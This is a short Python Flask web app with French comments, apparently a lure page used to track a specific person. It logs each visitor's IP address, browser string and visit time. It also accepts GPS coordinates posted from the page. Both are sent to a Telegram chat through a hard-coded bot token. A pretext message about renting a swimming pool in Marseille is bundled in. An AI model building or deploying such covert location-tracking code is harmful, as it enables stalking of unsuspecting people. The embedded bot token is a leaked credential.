from flask import Flask, request, render_template
import datetime
import requests

app = Flask(__name__)

# Configuration Telegram
TOKEN = "7249761868:AAEDYDMewdHuDCmCCfSZ6uZzj3PxOrtIQxw"
CHAT_ID = "6937350459"

def envoyer_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"[ERREUR TELEGRAM] {e}")

@app.route("/")
def accueil():
    ip = request.remote_addr
    navigateur = request.user_agent.string
    date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    message = (
        f"📥 Nouvelle visite détectée :\n"
        f"🕒 Date : {date}\n"
        f"🌍 IP : {ip}\n"
        f"🖥 Navigateur : {navigateur}\n\n"
        f"📩 Message envoyé :\n"
        f\"\"\"Bonjour, nous sommes intéressés par la location de la piscine. 
Nous sommes 10 personnes et souhaitons réserver pour le samedi 5 juillet à Marseille.
Pouvez-vous nous transmettre les informations nécessaires ? Merci. Cordialement, Mme Khanous.\"\"\"
    )
    envoyer_telegram(message)
    return render_template("page.html")

@app.route("/log_position", methods=["POST"])
def log_position():
    data = request.get_json()
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    if latitude and longitude:
        message = f"📍 Position GPS :\nLatitude : {latitude}\nLongitude : {longitude}"
        envoyer_telegram(message)
    return "", 204

if __name__ == "__main__":
    app.run(debug=True)
